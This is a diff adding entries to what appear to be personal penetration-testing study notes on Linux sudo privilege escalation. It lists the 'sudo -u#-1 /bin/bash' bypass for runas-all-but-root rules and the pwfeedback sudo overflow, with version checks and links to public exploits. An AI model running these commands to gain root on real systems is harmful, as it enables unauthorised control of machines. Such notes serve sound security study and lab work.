@@ -284,6 +284,16 @@ if you can read the passwd & shadow files you can use unshadow tool to get the h
  
 5- Sudo Shell Escaping
 -     sudo -l | GTFOBins  (check the SUDO)
+
+6- if the user can't run /bin/bash as a root
+-     sudo -l  --> if you get --> (ALL, !root) /bin/bash
+-     sudo -u#-1 /bin/bash    (getting root user)
+- https://www.exploit-db.com/exploits/47502
+
+7- pwfeedback
+-     sudo -V   (check sudo version) if version < 1.8.26 means && pwfeedback is enabled means there is a vuln
+-     sudo su root   (in the time of typing the password you see **** means pwfeedback is enabled)
+- take the exploit from this URL      https://github.com/saleemrashid/sudo-cve-2019-18634     use THM 'sudo buffer overflow root for your reference'
 -----------------------------------------------------------------Windows Privilege Escalation TCM---------------------------------------------------------------------
 - https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources
 - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
